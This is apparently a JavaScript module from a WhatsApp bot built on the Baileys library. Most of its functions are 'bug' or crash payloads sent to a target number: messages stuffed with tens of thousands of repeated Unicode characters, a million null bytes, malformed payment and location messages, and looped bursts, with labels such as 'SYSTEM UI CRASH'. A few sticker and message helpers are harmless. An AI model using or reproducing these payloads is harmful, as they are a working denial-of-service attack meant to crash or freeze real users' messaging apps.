/*

# Created By ptz
# Contact ? : t.me/KyuuDev

# Thanks For Devorsixcore
# Contact ? : t.me/imdevorsix
!- do not delete this credit
!- don't sell it, let alone distribute it

*/

const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys")
const fs = require("fs")
const { randomBytes } = require("crypto");
const { getBuffer, sleep } = require("../lib/myfunc")
const { tmpdir } = require("os")
const Crypto = require("crypto")
const ff = require('fluent-ffmpeg')
const webp = require("node-webpmux")
const path = require("path")
require("../config")

exports.location = async (ptz, target, kuwoted, ptcp = false) => {
target = String(target);
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
       viewOnceMessage: {
          message: {
            liveLocationMessage: {
            degreesLatitude: "call me ptz",
            degreesLongitude: "call me ptz",
            caption: `call me ptz`,
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
      }
  }
}), { userJid: target, quoted: kuwoted }
)
 
  await ptz.relayMessage(target, etc.message, ptcp ? { participant: { jid: target } } : {});
}

exports.IosShot = async (ptz, target) => {
  for (let i = `3`; i !== 0; i -= 1) {
     const crasoh = await ptz.relayMessage(target, {
		extendedTextMessage: {
			text: 'call me ptz',
			matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
			canonicalUrl: 'https://example.com',
			description: 'call me ptz',
			title: 'call me ptz',
			textArgb: 0xff000000,
			backgroundArgb: 0xffffffff,
			font: 1,
			previewType: 0,
			jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
			contextInfo: {
				},
			    	doNotPlayInline: false,
					thumbnailDirectPath: 'https://example.com/thumb.jpg',
					thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
					thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
		     		mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
		    		mediaKeyTimestamp: Date.now(),
					thumbnailHeight: 200,
					thumbnailWidth: 200,
					inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
					inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
					inviteLinkParentGroupThumbnailV2: Buffer.from('abcdef1234567890', 'hex'
					     ),
					   	inviteLinkGroupTypeV2: 0,
						viewOnce: true,
				}}, { participant: { jid: target }});
	}
	for (let i = `3`; i !== 0; i -= 1) {
       await ptz.relayMessage(target, {
			viewOnceMessage: {
     			message: {
	   			messageContextInfo: {
				deviceListMetadataVersion: 2,
		    	deviceListMetadata: {},
					},
					    interactiveMessage: {
						nativeFlowMessage: {
						buttons: [{
					    	name: 'payment_info',
							buttonParamsJson: '{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"RAPIKZ BOT BUG 🪲","key":"+916909137213","key_type":"X"}}]}',
									},
							    ],
					    	},
						},
					},
				},
			}, { participant: { jid: target } }, { messageId: null }
		);
	}
	for (let i = `3`; i !== 0; i -= 1) {
		await ptz.relayMessage(target, {
			viewOnceMessage: {
				message: {
				interactiveMessage: {
				header: {
				title: '',
				subtitle: ' ',
					},
			    		body: {
						text: 'call me ptz',
						},
					    footer: {
					    text: 'xp',
							},
					nativeFlowMessage: {
					buttons: [{
					name: 'cta_url',
					buttonParamsJson: "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
							},
						],
			       messageParamsJson: '\0'.repeat(1000000),
				  },
				},
			  },
			},
		  }, { participant: { jid: target } })}
}

exports.sendPaymentInfoMessage = async (ptz, target) => {
  await ptz.relayMessage(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadataVersion: 2,
          deviceListMetadata: {}
        },
        interactiveMessage: {
          nativeFlowMessage: {
            buttons: [{
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                currency: "BRL",
                total_amount: {
                  value: 0,
                  offset: 100
                },
                reference_id: "4P46GMY57GC",
                type: "physical-goods",
                order: {
                  status: "pending",
                  subtotal: {
                    value: 0,
                    offset: 100
                  },
                  order_type: "ORDER",
                  items: [{
                    name: "",
                    amount: {
                      value: 0,
                      offset: 100
                    },
                    quantity: 0,
                    sale_amount: {
                      value: 0,
                      offset: 100
                    }
                  }]
                },
                payment_settings: [{
                  type: "pix_static_code",
                  pix_static_code: {
                    merchant_name: "meu ovo",
                    key: "+5533998586057",
                    key_type: "X"
                  }
                }]
              })
            }]
          }
        }
      }
    }
  }, { participant: { jid: target }}, { messageId: null });
}

exports.coresix = async (ptz, target, kuwoted) => {
    
  async function xpayment (ptz, target) {
      var ptzn = `call me ptz` + "\uA9BE".repeat(50000);
      const rowrr = {};
      rowrr.hasMediaAttachment = true;
      rowrr.sequenceNumber = "0";
      rowrr.jpegThumbnail = "";
      var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: rowrr,
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k"+ ptzn +",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {
        userJid: target
      });
      await ptz.relayMessage(target, etc.message, {
        participant: {
          jid: target
        },
        messageId: etc.key.id
      });
    }
   
  async function paymentinfo(ptz, target) {
      const Kunyuk = {};
      Kunyuk.deviceListMetadataVersion = 2;
      Kunyuk.deviceListMetadata = {};
      const Kunyuk1 = {};
      Kunyuk1.value = 0;
      Kunyuk1.offset = 100;
      const Kunyuk2 = {};
      Kunyuk2.value = 0;
      Kunyuk2.offset = 100;
      const Kunyuk3 = {};
      Kunyuk3.value = 0;
      Kunyuk3.offset = 100;
      const Kunyuk4 = {};
      Kunyuk4.value = 0;
      Kunyuk4.offset = 100;
      const Kunyuk5 = {};
      Kunyuk5.name = "";
      Kunyuk5.amount = Kunyuk3;
      Kunyuk5.quantity = 0;
      Kunyuk5.sale_amount = Kunyuk4;
      const sixteen = {};
      sixteen.messageId = null;
      await ptz.relayMessage(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: Kunyuk,
            interactiveMessage: {
              nativeFlowMessage: {
                buttons: [{
                  name: "payment_info",
                  buttonParamsJson: JSON.stringify({
                    currency: "BRL",
                    total_amount: Kunyuk2,
                    reference_id: "4P46GMY57GC",
                    type: "physical-goods",
                    order: {
                      status: "pending",
                      subtotal: Kunyuk3,
                      order_type: "ORDER",
                      items: [Kunyuk5]
                    },
                    payment_settings: [{
                      type: "pix_static_code",
                      pix_static_code: {
                        merchant_name: "meu ovo",
                        key: "+5533998586057",
                        key_type: "X"
                      }
                    }]
                  })
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: target
        }
      }, sixteen);
    }
    
   async function xlocation (ptz, target, kuwoted) {
      var vov = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "call me ptz" + "\uA9BE".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: target,
        quoted: kuwoted
      });
      await ptz.relayMessage(target, vov.message, {
        participant: {
          jid: target
        },
        messageId: vov.key.id
      });
}
    
      for (let i = `3`; i !== 0; i -= 1) {
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await xlocation(ptz, target, kuwoted);
        await sleep(4000);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await paymentinfo(ptz, target);
        await xpayment(ptz, target);
        await sleep(6000);
      }
}
 exports.zodyck = async (ptz, target, text, amount, ptcp = false) => {
    await ptz.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};

exports.sendAnnotations = async (ptz, jid, videoUrl, text) => {
   await ptz.sendMessage(jid, {
                video: { url: videoUrl },  
                mimetype: "video/mp4",
                interactiveAnnotations: [
                    {
                        polygonVertices: [
                            { x: 60.71664810180664, y: -36.39784622192383 },
                            { x: -16.710189819335938, y: 49.263675689697266 },
                            { x: -56.585853576660156, y: 37.85963439941406 },
                            { x: 20.840980529785156, y: -47.80188751220703 }
                        ],
                        location: {
                            degreesLatitude: -7.64780786537579,
                            degreesLongitude: 111.51515875252841,
                            name: text
                        }
                    }
                ],
            },
            {}
        );
}

exports.editmsg = async (ptz, jid, e, t) => {
var a = [`${e}.`, `${e}..`, `${e}...`, `${e}.....`, `${t}`];
let { key: s } = await ptz.sendMessage(jid, {text: e});
for (let r = 0; r < a.length; r++) await ptz.sendMessage(jid, {text: a[r], edit: s
})
}

exports.addExifAvatar = async (buffer, packname, author, categories = ["🥀"], extra = {}) => {
const {
default: { Image },
} = await import("node-webpmux");
const img = new Image();
const json = {
  "sticker-pack-id": "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
  "sticker-pack-name": packname,
  "sticker-pack-publisher": author,
   emojis: categories,
  "is-ai-sticker": 1,
  "android-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',

  "ios-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
  ...extra,

};
let exifAttr = Buffer.from([
0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
]);
let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8");
let exif = Buffer.concat([exifAttr, jsonBuffer]);
exif.writeUIntLE(jsonBuffer.length, 14, 4);
await img.load(buffer);
img.exif = exif;
return await img.save(null);
}

exports.exifAvatar = async (buffer, packname, author, categories = [''], extra = {}) => {
  const { default: { Image }} = await import('node-webpmux')
	const img = new Image()
	const json = { 'sticker-pack-id': 'parel-kntll', 'sticker-pack-name': packname, 'sticker-pack-publisher': author, 'emojis': categories, 'is-avatar-sticker': 1, ...extra }
	let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
	let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
	let exif = Buffer.concat([exifAttr, jsonBuffer])
	exif.writeUIntLE(jsonBuffer.length, 14, 4)
	await img.load(buffer)
	 img.exif = exif
	return await img.save(null)
 }
 
exports.sendGalaxy = async (ptz, jid, text) => {
     let msg = await generateWAMessageFromContent(jid, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2,
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  body: proto.Message.InteractiveMessage.Body.create({
                    text,
                  }),
                  footer: proto.Message.InteractiveMessage.Footer.create({
                    text: global.author,
                  }),
                  nativeFlowMessage:
                    proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [
                        {
                          name: 'galaxy_message',
                          buttonParamsJson: JSON.stringify({
                            screen_2_OptIn_0: true,
                            screen_2_OptIn_1: true,
                            screen_1_Dropdown_0: 'test',
                            screen_1_DatePicker_1: '1028995200000',
                            screen_1_TextInput_2: 'test',
                            screen_1_TextInput_3: '94643116',
                            screen_0_TextInput_0: `radio - buttons${'\u0003'}`,
                            screen_0_TextInput_1: 'test',
                            screen_0_Dropdown_2: '001-Grimgar',
                            screen_0_RadioButtonsGroup_3: '0_true',
                            flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.',
                          }),
                        },
                      ],
                    }),
                }),
              },
            },
          },
          {}
        );
        return await ptz.relayMessage(msg.key.remoteJid, msg.message, {
          messageId: msg.key.id,
        });
      }

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
	require('fs').unwatchFile(file)
	console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
	delete require.cache[file]
	require(file)
})